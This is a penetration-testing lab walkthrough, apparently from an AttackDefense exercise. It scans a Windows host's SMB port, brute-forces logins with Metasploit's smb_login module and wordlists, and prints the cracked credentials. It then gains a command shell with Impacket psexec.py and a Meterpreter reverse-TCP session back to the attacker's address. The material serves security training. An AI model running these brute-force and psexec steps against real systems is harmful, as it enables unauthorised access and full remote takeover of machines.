# Exploiting SMB with PsExec

```sh
root@attackdefense:~# nmap 10.5.23.81 -sV -p445 -sC 
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-30 22:44 IST
Nmap scan report for 10.5.23.81
Host is up (0.0021s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-12-30 22:44:49
|_  start_date: 2023-12-30 22:33:19
```

Here is the scan result obtained from nmap. Now we will look for Metasploit payload for SMB login:

```sh
msf5 > search smb_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_login                   normal  No     SMB Login Check Scanner
```

and here we got it. After that we'll just use this script to brute force the password specially for the user Administrator:

```sh
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > set rhosts 10.5.23.81
rhosts => 10.5.23.81
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > set verbose false
verbose => false
msf5 auxiliary(scanner/smb/smb_login) > run

[+] 10.5.23.81:445        - 10.5.23.81:445 - Success: '.\sysadmin:samantha'
[+] 10.5.23.81:445        - 10.5.23.81:445 - Success: '.\demo:victoria'
[+] 10.5.23.81:445        - 10.5.23.81:445 - Success: '.\auditor:elizabeth'
[+] 10.5.23.81:445        - 10.5.23.81:445 - Success: '.\administrator:qwertyuiop' Administrator
[*] 10.5.23.81:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Now we can use psexec utility that is python implementation and allow us to authenticate with a target system.

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# psexec.py <a data-footnote-ref href="#user-content-fn-1">Administrator</a>@<a data-footnote-ref href="#user-content-fn-2">10.5.23.81</a> <a data-footnote-ref href="#user-content-fn-3">cmd.exe</a>
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.5.23.81.....
[*] Found writable share admin
[*] Uploading file qITOMtcx.exe
[*] Opening SVCManager on 10.5.23.81.....
[*] Creating service aEBC on 10.5.23.81.....
[*] Starting service aEBC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
</code></pre>

We can also use psexec metasploit payload but the above method is still recommended. The implementation we can see below:

```sh
msf5 > search psexec
.
.
.
msf5 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > set rhosts 10.5.23.81
rhosts => 10.5.23.81
msf5 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf5 exploit(windows/smb/psexec) > set SMBPass qwertyuiop
SMBPass => qwertyuiop
msf5 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.26.2:4444 
[*] 10.5.23.81:445 - Connecting to the server...
[*] 10.5.23.81:445 - Authenticating to 10.5.23.81:445 as user 'Administrator'...
[*] 10.5.23.81:445 - Selecting PowerShell target
[*] 10.5.23.81:445 - Executing the payload...
[+] 10.5.23.81:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176195 bytes) to 10.5.23.81
[*] Meterpreter session 1 opened (10.10.26.2:4444 -> 10.5.23.81:49815) at 2023-12-30 23:04:07 +0530

meterpreter > 
```

Here we got the meterpreter session.

[^1]: username

[^2]: target host

[^3]: command to be executed on the target
